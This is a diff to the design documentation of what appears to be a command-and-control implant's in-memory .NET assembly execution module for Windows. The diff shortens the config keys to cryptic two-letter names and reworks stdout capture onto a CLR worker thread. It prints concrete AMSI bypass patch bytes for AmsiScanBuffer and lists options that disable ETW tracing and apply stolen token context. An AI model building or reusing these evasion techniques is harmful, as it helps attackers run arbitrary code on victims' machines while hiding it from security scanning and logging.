@@ -140,72 +140,28 @@ RET            ; C3
 
 ## Output Capture
 
-### Strategy: File Redirection
+### Persistent File Redirection
 
-The most stable output capture method uses temporary file redirection:
-
-```go
-func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
-    // Create temp file
-    outputFile := filepath.Join(os.TempDir(), "clr_output_"+timestamp+".txt")
-
-    // Create file handle
-    fileHandle, _, _ := createFileW.Call(
-        outputPath,
-        GENERIC_WRITE|GENERIC_READ,
-        FILE_SHARE_READ|FILE_SHARE_WRITE,
-        0,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
-        0,
-    )
-
-    // Save and redirect handles
-    origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE)
-    origStderr, _, _ := getStdHandle.Call(STD_ERROR_HANDLE)
-    setStdHandle.Call(STD_OUTPUT_HANDLE, fileHandle)
-    setStdHandle.Call(STD_ERROR_HANDLE, fileHandle)
-
-    // Execute assembly
-    retCode, err := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
-
-    // Restore handles
-    setStdHandle.Call(STD_OUTPUT_HANDLE, origStdout)
-    setStdHandle.Call(STD_ERROR_HANDLE, origStderr)
-
-    // Read captured output
-    output, _ := os.ReadFile(outputFile)
-    return string(output), retCode, err
-}
-```
-
-### Strategy: Pipe Capture
-
-Alternatively, output can be captured via anonymous pipes:
+Output capture uses a single persistent temp file, created once when the CLR worker initializes. The file is truncated before each execution and read back after:
 
 ```go
-func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
-    // Create pipe with large buffer
-    var readPipe, writePipe syscall.Handle
-    syscall.CreatePipe(&readPipe, &writePipe, nil, 1024*1024)
+// Worker init (once per agent lifetime)
+captureFile, _ = os.CreateTemp("", "t")
+setStdHandle.Call(STD_OUTPUT_HANDLE, captureFile.Fd())
+setStdHandle.Call(STD_ERROR_HANDLE, captureFile.Fd())
 
-    // Redirect stdout/stderr to write pipe
-    setStdHandle.Call(STD_OUTPUT_HANDLE, uintptr(writePipe))
-    setStdHandle.Call(STD_ERROR_HANDLE, uintptr(writePipe))
+// Per-execution capture
+captureFile.Truncate(0)
+captureFile.Seek(0, io.SeekStart)
 
-    // Also redirect CRT file descriptors
-    fd, _, _ := openOsfhandle.Call(uintptr(writePipe), 0x8000)
-    dup2.Call(fd, 1)  // stdout
-    dup2.Call(fd, 2)  // stderr
+// ... execute assembly ...
 
-    // Execute assembly
-    retCode, err := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
-
-    // Close write end and read all output
-    syscall.CloseHandle(writePipe)
-    // ... read from readPipe ...
-}
+captureFile.Seek(0, io.SeekStart)
+capturedBytes, _ := io.ReadAll(captureFile)
+output = string(capturedBytes)
 ```
+
+The persistent file approach avoids the CLR error (0x80131604) that occurs when stdout handles are closed between executions.
 
 ---
 
@@ -238,7 +194,7 @@ func applyTokenContextForInlineAssembly() func() {
 }
 ```
 
-**Note:** Token context is applied BEFORE COM initialization to ensure the CLR runs under the correct identity.
+**Note:** COM is initialized once on the CLR worker thread during startup. Token context is applied per-execution after the work request reaches the worker thread.
 
 ---
 
@@ -248,15 +204,15 @@ func applyTokenContextForInlineAssembly() func() {
 
 ```json
 {
-  "assembly_b64": "<base64 encoded assembly>",
-  "arguments": ["arg1", "arg2"],
-  "app_domain": "CustomDomain",
-  "bypass_amsi": true,
-  "bypass_etw": false,
-  "revert_etw": false,
-  "entry_point": "Main",
-  "use_pipe": false,
-  "pipe_name": ""
+  "ab": "<base64 encoded assembly>",
+  "ar": ["arg1", "arg2"],
+  "ad": "CustomDomain",
+  "ba": true,
+  "be": false,
+  "re": false,
+  "ep": "Main",
+  "up": false,
+  "pm": ""
 }
 ```
 
@@ -264,15 +220,15 @@ func applyTokenContextForInlineAssembly() func() {
 
 | Option | Description |
 |--------|-------------|
-| `assembly_b64` | Base64-encoded assembly bytes |
-| `arguments` | Command-line arguments array |
-| `app_domain` | Custom AppDomain name (optional) |
-| `bypass_amsi` | Patch AMSI before execution |
-| `bypass_etw` | Disable ETW tracing |
-| `revert_etw` | Restore ETW after execution |
-| `entry_point` | Custom entry point method |
-| `use_pipe` | Use named pipe for output |
-| `pipe_name` | Named pipe name |
+| `ab` | Base64-encoded assembly bytes |
+| `ar` | Command-line arguments array |
+| `ad` | Custom AppDomain name (optional) |
+| `ba` | Patch AMSI before execution |
+| `be` | Disable ETW tracing |
+| `re` | Restore ETW after execution |
+| `ep` | Custom entry point method |
+| `up` | Use named pipe for output |
+| `pm` | Named pipe name |
 
 ---
 
@@ -292,17 +248,16 @@ func applyTokenContextForInlineAssembly() func() {
 
 1. Parse JSON configuration
 2. Base64 decode assembly bytes
-3. Detect assembly type (EXE vs DLL)
-4. Initialize exit prevention (once)
-5. Apply AMSI bypass if requested
-6. Apply token context
-7. Initialize COM
-8. Setup output capture
-9. Load and execute assembly
-10. Capture exit code
-11. Read captured output
-12. Restore handles
-13. Return result
+3. Initialize exit prevention (once)
+4. Apply AMSI bypass if requested
+5. Send work to CLR worker (COM already initialized on worker thread)
+6. Apply token context on worker thread
+7. Load CLR and create AppDomain (cached after first use)
+8. Create SafeArray from assembly bytes
+9. Load assembly via `AppDomain.Load_3`
+10. Get entry point and invoke via `MethodInfo.Invoke_3`
+11. Read captured output from persistent temp file
+12. Return result
 
 ---
 
@@ -323,18 +278,24 @@ func applyTokenContextForInlineAssembly() func() {
 Async assemblies run as tracked jobs:
 
 ```go
-type AssemblyJob struct {
-    ID          string
-    CommandID   string
-    CommandDBID int
-    AgentID     string
-    Name        string
-    Status      string  // running, completed, failed, killed
-    StartTime   time.Time
-    EndTime     *time.Time
-    Output      strings.Builder
-    Error       error
-    CancelChan  chan bool
+type NativeJob struct {
+    ID              string
+    CID             string
+    DID             int
+    AID             string
+    Name            string
+    Status          string  // running, completed, failed, killed, timeout
+    StartTime       time.Time
+    EndTime         *time.Time
+    Output          strings.Builder
+    OutputMutex     sync.Mutex
+    OutputTruncated bool
+    TotalBytesSent  int
+    Error           error
+    CancelChan      chan bool
+    Cmd             *NativeRunMsg
+    Process         *os.Process
+    CredCtx         *CredContext
 }
 ```
 
@@ -346,6 +307,7 @@ type AssemblyJob struct {
 | `completed` | Finished successfully |
 | `failed` | Execution error occurred |
 | `killed` | Manually terminated |
+| `timeout` | Exceeded execution timeout |
 
 ### Job Commands
 
@@ -354,58 +316,32 @@ type AssemblyJob struct {
 | `inline-assembly-jobs` | List all assembly jobs |
 | `inline-assembly-output <id>` | Get job output |
 | `inline-assembly-kill <id>` | Kill running job |
-
----
-
-## Assembly Detection
-
-### EXE vs DLL Detection
-
-The agent checks PE headers to determine assembly type:
-
-```go
-func (c *InlineAssemblyCommand) isDLLAssembly(assemblyBytes []byte) bool {
-    // Check for MZ header
-    if assemblyBytes[0] != 'M' || assemblyBytes[1] != 'Z' {
-        return false
-    }
-
-    // Get PE header offset from 0x3C
-    peOffset := int32(assemblyBytes[0x3C]) | ...
-
-    // Check IMAGE_FILE_DLL flag (0x2000) in Characteristics
-    characteristics := uint16(assemblyBytes[peOffset+0x16]) | ...
-    return (characteristics & 0x2000) != 0
-}
-```
+| `inline-assembly-clean` | Clean up completed/failed jobs |
+| `inline-assembly-stats` | Show CLR worker statistics |
 
 ---
 
 ## Thread Safety
 
-### OS Thread Locking
+### CLR Worker Pattern
 
-Assembly execution requires thread locking for COM and CLR:
-
-```go
-runtime.LockOSThread()
-defer runtime.UnlockOSThread()
-```
-
-### Execution Mutex
-
-Synchronous executions are serialized:
+Assembly execution is serialized through a channel-based worker pattern. A single goroutine with `runtime.LockOSThread()` processes all CLR work requests:
 
 ```go
-var clrExecutionMutex sync.Mutex
+var clrWorkerCh chan clrWorkRequest // buffer size 4
 
-func (c *InlineAssemblyCommand) Execute(...) {
-    clrExecutionMutex.Lock()
-    clrExecutionCount++
-    clrExecutionMutex.Unlock()
-    // ...
+func clrWorkerLoop() {
+    runtime.LockOSThread()
+    coInitializeEx.Call(0, 0) // COM init once
+    // ... setup capture file once ...
+    for req := range clrWorkerCh {
+        result := processCLRWork(req)
+        req.resultCh <- result
+    }
 }
 ```
+
+The execution count mutex is used only briefly to track execution count, not to serialize execution itself.
 
 ---
 
@@ -419,8 +355,7 @@ func (c *InlineAssemblyCommand) Execute(...) {
 | E43 | No assembly data provided |
 | E44 | Invalid JSON configuration |
 | E45 | Base64 decode failed |
-| E46 | Assembly execution failed |
-| E52 | Assembly crashed/panic |
+| E52 | Assembly execution failed (CLR error or panic during execution) |
 
 ### Panic Recovery
 
@@ -442,17 +377,15 @@ defer func() {
 
 ### Overview
 
-When `bypass_amsi` is enabled, the agent patches the AmsiScanBuffer function:
+When `ba` is enabled, the agent patches the AmsiScanBuffer function:
 
-```go
-func patchAMSI() {
-    // Load amsi.dll
-    // Find AmsiScanBuffer
-    // Patch first bytes with return AMSI_RESULT_CLEAN
-}
+```asm
+; Patch bytes: {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
+MOV EAX, 0x80070057  ; E_INVALIDARG
+RET
 ```
 
-This prevents AMSI from scanning loaded assemblies.
+This causes AmsiScanBuffer to return E_INVALIDARG, preventing AMSI from scanning loaded assemblies.
 
 ---
 
@@ -485,3 +418,4 @@ Running multiple .NET assemblies may cause CLR state corruption. If assemblies f
 | Async Execution | `server/docker/payloads/Windows/action_inline_assembly_async.go` |
 | Job Management | `server/docker/payloads/Windows/action_inline_assembly_async_jobs.go` |
 | Exit Prevention | `server/docker/payloads/Windows/clr_exit_prevention.go` |
+| AMSI/ETW Patching | `server/docker/payloads/Windows/patches.go` |
